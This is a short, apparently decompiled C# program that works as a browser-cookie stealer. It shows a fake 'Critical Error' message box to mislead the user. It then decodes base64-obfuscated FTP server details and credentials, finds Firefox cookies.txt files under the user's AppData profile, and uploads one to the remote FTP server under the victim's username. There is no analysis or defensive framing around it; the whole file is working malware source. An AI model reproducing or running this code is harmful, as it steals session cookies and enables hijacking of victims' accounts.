using System;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

public class MainClass
{
	public static void Main()
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		MainClass mainClass = new MainClass();
		MessageBox.Show("Access violation at Adress 0x3213", "Critical Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		string text = "ftp://" + mainClass.h0yt3r_DeCrypt("MQAyADMA") + "/";
		string userName = mainClass.h0yt3r_DeCrypt("MQAyADMA");
		string password = mainClass.h0yt3r_DeCrypt("MQAyADMA");
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		string[] files = Directory.GetFiles(path, "cookies.txt", SearchOption.AllDirectories);
		string userName2 = SystemInformation.get_UserName();
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(text + userName2 + ".txt");
		ftpWebRequest.Method = "STOR";
		ftpWebRequest.Credentials = new NetworkCredential(userName, password);
		ftpWebRequest.UsePassive = true;
		ftpWebRequest.UseBinary = true;
		ftpWebRequest.KeepAlive = false;
		FileStream fileStream = File.OpenRead(files[0]);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		fileStream.Close();
		Stream requestStream = ftpWebRequest.GetRequestStream();
		requestStream.Write(array, 0, array.Length);
		requestStream.Close();
	}

	public string h0yt3r_DeCrypt(string toDecrypt)
	{
		return Encoding.Unicode.GetString(Convert.FromBase64String(toDecrypt));
	}
}
